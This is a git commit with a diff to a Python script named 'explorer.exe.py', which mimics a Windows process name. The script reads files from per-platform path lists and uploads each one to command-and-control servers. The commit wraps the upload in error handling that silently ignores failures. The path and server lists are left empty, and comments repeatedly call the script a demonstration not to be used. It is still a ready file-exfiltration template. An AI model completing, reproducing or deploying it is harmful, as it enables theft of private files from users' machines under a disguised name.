d4af3c73ba68c6ac89a78741239366dd4faf6f95
dbrasher <dbrasher5@ivytech.edu>
2024-03-18 11:24:18 -0400

    Implement basic file closing and error handling. The file closing should be redundant because of the `with` statement, but I added it anyway.  And again: Remember NEVER to use `explorer.exe.py`. It is ONLY a demonstration.

--- explorer.exe.py
+++ explorer.exe.py
@@ -6,8 +6,12 @@ import requests, sys, os
 
 for fp in [fp for fp in {"win32": [], "darwin": [], "linux": []}.get(sys.platform, []) if os.path.isfile(fp)]: # Add desired filepaths to exfiltrate for each system ("darwin" usually means MacOS). Don't forget, this should NEVER be used.
     for ccs in []: # Your command/control server(s) go(es) here. You don't actually have any because you're not using this for stealing, of course.
-        with open(fp) as f:
-            requests.post(url=ccs, files={fp: f}, auth=None) # Authentication token for upload, `None` if you don't want to use one. Did I mention you should NOT use this?
+        try:
+            with open(fp) as f:
+                requests.post(url=ccs, files={fp: f}, auth=None) # Authentication token for upload, `None` if you don't want to use one. Did I mention you should NOT use this?
+                f.close()
+        except:
+            pass
 
 # I REPEAT: DO NOT ACTUALLY USE THIS, STEALING IS BAD
 
